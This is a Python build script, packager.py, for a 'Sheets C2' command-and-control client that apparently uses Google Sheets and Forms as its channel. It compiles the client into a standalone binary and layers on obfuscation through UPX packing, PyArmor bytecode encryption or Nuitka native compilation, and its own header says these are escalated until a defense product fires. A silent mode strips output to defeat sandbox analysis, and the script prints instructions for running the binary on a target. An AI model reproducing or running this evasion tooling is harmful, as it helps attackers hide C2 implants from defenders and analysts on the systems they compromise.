#!/usr/bin/env python3
"""
packager.py — build a standalone client binary using PyInstaller

Usage:
    python packager.py

Produces a single executable in dist/ for the current OS.
Environment variables must be set at runtime — they are NOT baked into the binary.

Obfuscation profiles (escalate until defense product fires):
    basic    — PyInstaller --onefile (default)
    upx      — PyInstaller + UPX compression
    pyarmor  — PyArmor source encryption + PyInstaller
    nuitka   — Nuitka native compilation              (planned)
"""

import glob
import os
import shutil
import subprocess
import sys
import tempfile


# ---------------------------------------------------------------------------
# Prompt helpers
# ---------------------------------------------------------------------------

def _ask(prompt, choices, default=None):
    """Ask a multiple-choice question. Returns chosen key."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        marker = " (default)" if k == default else ""
        print(f"  [{i}] {label}{marker}")
    while True:
        raw = input("  Choice: ").strip()
        if raw == "" and default:
            return default
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return keys[int(raw) - 1]
        print("  Invalid — enter a number from the list.")


def _ask_multi(prompt, choices):
    """Ask a multiple-choice question allowing 'all'. Returns list of keys."""
    print(f"\n{prompt}")
    keys = list(choices.keys())
    for i, (k, label) in enumerate(choices.items(), 1):
        print(f"  [{i}] {label}")
    print(f"  [a] All of the above")
    while True:
        raw = input("  Choice: ").strip().lower()
        if raw == "a":
            return keys
        if raw.isdigit() and 1 <= int(raw) <= len(keys):
            return [keys[int(raw) - 1]]
        print("  Invalid — enter a number or 'a'.")


# ---------------------------------------------------------------------------
# Hidden import sets per module
# ---------------------------------------------------------------------------

CRYPTO_IMPORTS = {
    "plaintext": ["crypto.plaintext"],
    "fernet":    ["crypto.fernet"],
}

FRAGMENTER_IMPORTS = {
    "passthrough": ["fragmenter.passthrough"],
    "fixed":       ["fragmenter.fixed"],
}

# Always included — channel is always Sheets for now
ALWAYS_IMPORTS = [
    "channel.sheets",
    "channel.base",
    "crypto.base",
    "fragmenter.base",
]

# PyArmor encrypts bytecode so PyInstaller cannot trace imports inside client.py.
# These stdlib modules must be declared explicitly when using the pyarmor profile.
PYARMOR_STDLIB_IMPORTS = [
    "uuid", "json", "platform", "subprocess", "random",
    "getpass", "datetime", "time", "os",
]


# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------

def _silence_client(dst_dir):
    """Write a silenced copy of client.py to dst_dir.

    Prepends 'print = lambda *_a, **_kw: None' so every print() call in the
    client becomes a no-op. No AST parsing needed — the lambda intercepts all
    calls regardless of arguments or line count.
    """
    with open("client.py") as f:
        source = f.read()
    dest = os.path.join(dst_dir, "client.py")
    with open(dest, "w") as f:
        f.write("print = lambda *_a, **_kw: None  # --silent build\n")
        f.write(source)
    return dest


def _pyinstaller_base_cmd(hidden_imports, output_name, entry="client.py", extra_paths=None):
    """Build the common PyInstaller command shared by basic and upx profiles."""
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--clean",
        "--name", output_name,
        "--distpath", "dist",
        "--workpath", "build",
        "--specpath", "build",
    ]
    if extra_paths:
        for p in extra_paths:
            cmd += ["--paths", p]
    for imp in hidden_imports:
        cmd += ["--hidden-import", imp]
    cmd.append(entry)
    return cmd


def build_basic(hidden_imports, output_name, silent=False):
    """PyInstaller --onefile, no compression."""
    tmpdir = None
    try:
        if silent:
            tmpdir = tempfile.mkdtemp(prefix="silent_build_")
            entry = _silence_client(tmpdir)
            cmd = _pyinstaller_base_cmd(hidden_imports, output_name, entry,
                                        extra_paths=[os.getcwd()])
        else:
            cmd = _pyinstaller_base_cmd(hidden_imports, output_name)
        print(f"\n[packager] Running: {' '.join(cmd)}\n")
        result = subprocess.run(cmd)
        return result.returncode == 0
    finally:
        if tmpdir:
            shutil.rmtree(tmpdir, ignore_errors=True)


def build_upx(hidden_imports, output_name, silent=False):
    """PyInstaller --onefile, then UPX applied directly to the output binary.

    PyInstaller disables its built-in UPX integration on Linux due to known
    compatibility issues, so we run UPX on the finished binary instead.
    UPX adds a decompression stub — an analyst must 'upx -d' the binary before
    the Python layer is accessible. Typical size reduction: 40-50%.
    """
    upx_path = shutil.which("upx")
    if not upx_path:
        print("[packager] UPX not found on PATH — install with: sudo apt install upx")
        return False

    tmpdir = None
    try:
        # Step 1 — build with PyInstaller (no --upx-dir, avoid the disabled integration)
        if silent:
            tmpdir = tempfile.mkdtemp(prefix="silent_build_")
            entry = _silence_client(tmpdir)
            cmd = _pyinstaller_base_cmd(hidden_imports, output_name, entry,
                                        extra_paths=[os.getcwd()])
        else:
            cmd = _pyinstaller_base_cmd(hidden_imports, output_name)
        print(f"\n[packager] Step 1 — PyInstaller build")
        print(f"[packager] Running: {' '.join(cmd)}\n")
        result = subprocess.run(cmd)
        if result.returncode != 0:
            return False

        # Step 2 — compress the output binary directly with UPX
        ext = ".exe" if sys.platform == "win32" else ""
        binary = os.path.join("dist", output_name + ext)
        print(f"\n[packager] Step 2 — UPX compression")
        print(f"[packager] Note: PyInstaller --onefile already compresses its payload,")
        print(f"[packager] so size reduction will be minimal (~0-2%). UPX still wraps")
        print(f"[packager] the binary with a different header/stub, changing its signature.")
        upx_cmd = [upx_path, "--best", binary]
        print(f"[packager] Running: {' '.join(upx_cmd)}\n")
        result = subprocess.run(upx_cmd)
        if result.returncode == 0:
            # UPX creates a .upx backup of the original — remove it
            backup = binary + ".upx"
            if os.path.exists(backup):
                os.remove(backup)
        return result.returncode == 0
    finally:
        if tmpdir:
            shutil.rmtree(tmpdir, ignore_errors=True)


def build_pyarmor(hidden_imports, output_name, silent=False):
    """PyArmor source encryption, then PyInstaller bundles the obfuscated tree.

    Pipeline:
      1. pyarmor gen -O <tmpdir> client.py
         Produces tmpdir/client.py (obfuscated) + tmpdir/pyarmor_runtime_XXXXXX/
      2. Copy all other source files/packages into tmpdir so PyInstaller
         can find them relative to the obfuscated entry point.
      3. PyInstaller --onefile with --paths=tmpdir and
         --hidden-import=pyarmor_runtime_XXXXXX (the generated runtime package).

    What an analyst gets after extraction:
      pyinstxtractor yields encrypted bytecode (.pyc files that begin with
      the PyArmor header) instead of readable source.  The pyarmor_runtime .so
      is required to decrypt them — without the matching key it produces garbage.
    """
    # Prefer the pyarmor installed alongside this Python (venv-aware)
    pyarmor_path = os.path.join(os.path.dirname(sys.executable), "pyarmor")
    if not os.path.isfile(pyarmor_path):
        pyarmor_path = shutil.which("pyarmor")
    if not pyarmor_path:
        print("[packager] pyarmor not found — install with: pip install pyarmor")
        return False

    tmpdir = tempfile.mkdtemp(prefix="pyarmor_build_")
    src_tmpdir = None
    try:
        # Step 1 — obfuscate client.py into tmpdir
        # In silent mode, obfuscate the silenced copy so prints are gone before
        # PyArmor encrypts — the lambda is compiled into the encrypted bytecode.
        print(f"\n[packager] Step 1 — PyArmor obfuscation")
        if silent:
            src_tmpdir = tempfile.mkdtemp(prefix="silent_src_")
            src_client = _silence_client(src_tmpdir)
        else:
            src_client = "client.py"
        armorcmd = [pyarmor_path, "gen", "-O", tmpdir, src_client]
        print(f"[packager] Running: {' '.join(armorcmd)}\n")
        result = subprocess.run(armorcmd)
        if result.returncode != 0:
            return False

        # Step 2 — discover the generated runtime package name
        runtime_pkgs = glob.glob(os.path.join(tmpdir, "pyarmor_runtime_*"))
        if not runtime_pkgs:
            print("[packager] Could not find pyarmor_runtime_* package in obfuscation output.")
            return False
        runtime_name = os.path.basename(runtime_pkgs[0])
        print(f"[packager] Runtime package: {runtime_name}")

        # Step 3 — copy remaining source files into tmpdir
        print(f"\n[packager] Step 2 — Copying source tree to {tmpdir}")
        for name in ("common.py",):
            src = os.path.join(os.getcwd(), name)
            if os.path.exists(src):
                shutil.copy2(src, tmpdir)
        for pkg in ("channel", "crypto", "fragmenter"):
            src = os.path.join(os.getcwd(), pkg)
            dst = os.path.join(tmpdir, pkg)
            if os.path.exists(src) and not os.path.exists(dst):
                shutil.copytree(src, dst)

        # Step 4 — PyInstaller from the obfuscated entry point
        # PyArmor's encryption hides all import statements from PyInstaller's
        # static tracer, so stdlib modules used by client.py must be listed
        # explicitly via --hidden-import.
        print(f"\n[packager] Step 3 — PyInstaller bundle")
        entry = os.path.join(tmpdir, "client.py")
        all_imports = list(PYARMOR_STDLIB_IMPORTS) + list(hidden_imports)
        cmd = [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--clean",
            "--name", output_name,
            "--distpath", "dist",
            "--workpath", "build",
            "--specpath", "build",
            "--paths", tmpdir,
            "--hidden-import", runtime_name,
        ]
        for imp in all_imports:
            cmd += ["--hidden-import", imp]
        cmd.append(entry)
        print(f"[packager] Running: {' '.join(cmd)}\n")
        result = subprocess.run(cmd)
        return result.returncode == 0

    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
        if src_tmpdir:
            shutil.rmtree(src_tmpdir, ignore_errors=True)


def build_nuitka(hidden_imports, output_name, silent=False):
    """Compile client to a native binary via Nuitka.

    Nuitka compiles Python → C → native ELF/.exe. There is no Python bytecode
    anywhere in the output — not encrypted, not hidden, simply absent.
    An analyst is left with a native binary and must use a disassembler.

    Requires: pip install nuitka
              gcc (Linux/macOS) or MSVC/MinGW (Windows)
              patchelf (Linux only): sudo apt install patchelf

    Note: do NOT run strip or UPX on the Nuitka --onefile binary. Nuitka
    embeds its compressed payload in a custom ELF section — strip removes it,
    UPX corrupts the bootstrap. Both cause a segfault at runtime.

    Build time is significantly longer than PyInstaller (several minutes).
    Nuitka may download a dependency bootstrap on first run — this is normal.
    """
    nuitka_path = os.path.join(os.path.dirname(sys.executable), "nuitka")
    if not os.path.isfile(nuitka_path):
        nuitka_path = shutil.which("nuitka")
    if not nuitka_path:
        print("[packager] nuitka not found — install with: pip install nuitka")
        return False

    if sys.platform == "linux" and not shutil.which("patchelf"):
        print("[packager] patchelf not found — required by Nuitka --onefile on Linux.")
        print("  Install with: sudo apt install patchelf")
        return False

    dist_dir = os.path.join(os.getcwd(), "dist")
    tmpdir = None
    try:
        if silent:
            tmpdir = tempfile.mkdtemp(prefix="nuitka_build_")
            entry = _silence_client(tmpdir)
            # Copy all source packages so Nuitka can resolve imports from tmpdir
            for name in ("common.py",):
                src = os.path.join(os.getcwd(), name)
                if os.path.exists(src):
                    shutil.copy2(src, tmpdir)
            for pkg in ("channel", "crypto", "fragmenter"):
                src = os.path.join(os.getcwd(), pkg)
                dst = os.path.join(tmpdir, pkg)
                if os.path.exists(src) and not os.path.exists(dst):
                    shutil.copytree(src, dst)
        else:
            entry = "client.py"

        # Step 1 — Nuitka compilation
        cmd = [
            sys.executable, "-m", "nuitka",
            "--onefile",
            f"--output-dir={dist_dir}",
            f"--output-filename={output_name}",
            "--assume-yes-for-downloads",
        ]
        for imp in hidden_imports:
            cmd += [f"--include-module={imp}"]
        cmd.append(entry)

        print(f"\n[packager] Running: {' '.join(cmd)}")
        print(f"[packager] Note: Nuitka compilation takes several minutes — this is normal.\n")
        result = subprocess.run(cmd)
        return result.returncode == 0

    finally:
        if tmpdir:
            shutil.rmtree(tmpdir, ignore_errors=True)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 52)
    print("  Sheets C2 — Client Packager")
    print("=" * 52)
    print(f"  Platform : {sys.platform}")
    print(f"  Python   : {sys.version.split()[0]}")
    print()
    print("  The binary reads config from environment variables at runtime.")
    print("  No credentials are baked in.")

    # ── Profile ──────────────────────────────────────────────────────────────
    profile = _ask(
        "Obfuscation profile:",
        {
            "basic":   "Basic   — PyInstaller --onefile (default)",
            "upx":     "UPX     — PyInstaller + UPX compression",
            "pyarmor": "PyArmor — source encryption + PyInstaller",
            "nuitka":  "Nuitka  — native compilation (no Python bytecode)",
        },
        default="basic",
    )

    # ── Silent mode ───────────────────────────────────────────────────────────
    print("\nSilent mode? Strips all console output from the binary.")
    print("  Defeats dynamic sandbox analysis that watches stdout/stderr.")
    raw = input("  Enable silent mode? [y/N]: ").strip().lower()
    silent = raw in ("y", "yes")
    if silent:
        print("  [packager] Silent mode enabled — print() calls will be suppressed.")

    # ── Crypto modules ────────────────────────────────────────────────────────
    crypto_choices = _ask_multi(
        "Which encryption module(s) to include?",
        {
            "plaintext": "Plaintext — no encryption (debug/demo)",
            "fernet":    "Fernet    — AES + HMAC (recommended for ops)",
        },
    )

    # ── Fragmenter modules ────────────────────────────────────────────────────
    frag_choices = _ask_multi(
        "Which fragmentation module(s) to include?",
        {
            "passthrough": "Passthrough — no fragmentation (default)",
            "fixed":       "Fixed       — fixed-size chunks",
        },
    )

    # ── Output name ───────────────────────────────────────────────────────────
    default_name = "client"
    raw = input(f"\n  Output binary name (default: {default_name}): ").strip()
    output_name = raw if raw else default_name

    # ── Collect hidden imports ────────────────────────────────────────────────
    hidden = list(ALWAYS_IMPORTS)
    for c in crypto_choices:
        hidden += CRYPTO_IMPORTS[c]
    for f in frag_choices:
        hidden += FRAGMENTER_IMPORTS[f]

    print(f"\n[packager] Hidden imports: {hidden}")

    # ── Build ─────────────────────────────────────────────────────────────────
    if profile == "upx":
        ok = build_upx(hidden, output_name, silent=silent)
    elif profile == "pyarmor":
        ok = build_pyarmor(hidden, output_name, silent=silent)
    elif profile == "nuitka":
        ok = build_nuitka(hidden, output_name, silent=silent)
    else:
        ok = build_basic(hidden, output_name, silent=silent)

    if ok:
        ext = ".exe" if sys.platform == "win32" else ""
        binary = os.path.join("dist", output_name + ext)
        size_mb = os.path.getsize(binary) / 1024 / 1024
        print(f"\n[packager] Binary: {binary}  ({size_mb:.1f} MB)")
        print(f"[packager] Run on target:")
        print(f"  PYTHONUNBUFFERED=1 SPREADSHEET_ID=xxx FORMS_URL=xxx ./{output_name}{ext}")
        print(f"  (PYTHONUNBUFFERED=1 ensures logs appear immediately)")
    else:
        print("\n[packager] Build failed — check PyInstaller output above.")
        sys.exit(1)


if __name__ == "__main__":
    main()
